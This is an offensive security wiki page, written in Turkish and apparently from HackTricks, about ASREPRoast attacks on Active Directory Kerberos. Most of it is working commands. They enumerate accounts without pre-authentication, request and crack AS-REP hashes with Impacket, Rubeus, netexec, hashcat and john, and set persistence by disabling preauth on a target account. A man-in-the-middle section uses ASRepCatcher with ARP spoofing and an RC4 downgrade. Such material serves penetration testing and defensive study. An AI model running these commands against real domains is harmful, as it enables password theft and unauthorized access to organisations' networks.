# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast, **Kerberos pre-authentication required attribute** özelliğine sahip olmayan kullanıcıları suistimal eden bir güvenlik saldırısıdır. Temelde bu zafiyet, saldırganların kullanıcının parolasına ihtiyaç duymadan Etki Alanı Denetleyicisi (DC)'nden bir kullanıcı için kimlik doğrulama talep etmelerine olanak tanır. DC, daha sonra kullanıcının parolasından türetilen anahtarla şifrelenmiş bir mesajla yanıt verir; saldırganlar bu mesajı çevrimdışı kırmayı deneyerek kullanıcının parolasını keşfedebilirler.

Bu saldırının temel gereksinimleri şunlardır:

- **Lack of Kerberos pre-authentication**: Hedef kullanıcıların bu güvenlik özelliği etkin olmamalıdır.
- **Etki Alanı Denetleyicisi (DC) ile bağlantı**: Saldırganların istek göndermek ve şifrelenmiş mesajlar almak için DC'ye erişimi olması gerekir.
- **Opsiyonel etki alanı hesabı**: Bir etki alanı hesabına sahip olmak, saldırganların LDAP sorguları aracılığıyla zafiyetli kullanıcıları daha verimli şekilde belirlemesini sağlar. Böyle bir hesaba sahip değillerse, saldırganlar kullanıcı adlarını tahmin etmek zorunda kalır.

#### Zafiyetli kullanıcıların belirlenmesi (etki alanı kimlik bilgileri gerekir)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP mesajı iste
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus 0x17 encryption type ve preauth type 0 olan bir 4768 oluşturacaktır.

#### Hızlı tek satırlık komutlar (Linux)

- Önce potansiyel hedefleri (ör. leaked build paths'ten) Kerberos userenum ile listeleyin: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Tek bir kullanıcının AS-REP'ini **boş** şifreyle bile şu komutla çekin: `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec ayrıca LDAP signing/channel binding posture bilgisini de yazdırır).
- `hashcat out.asreproast /path/rockyou.txt` ile kırın — AS-REP roast hash'leri için otomatik olarak **-m 18200** (etype 23) algılar.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

Bir kullanıcı için **preauth** gerekmemesini, **GenericAll** izinlerine (veya özellikleri yazma izinlerine) sahip olduğunuz durumda zorlayın:
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast without credentials

Bir saldırgan, ağ üzerinde ilerlerken AS-REP paketlerini yakalamak için bir man-in-the-middle pozisyonu kullanabilir ve bunun için Kerberos pre-authentication'ın devre dışı bırakılmasına dayanmak zorunda değildir. Bu nedenle VLAN'daki tüm kullanıcılar için çalışır.\ 
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) bize bunu yapma imkanı sağlar. Ayrıca araç, Kerberos negotiation'ı değiştirerek istemci iş istasyonlarını RC4 kullanmaya zorlar.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referanslar

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
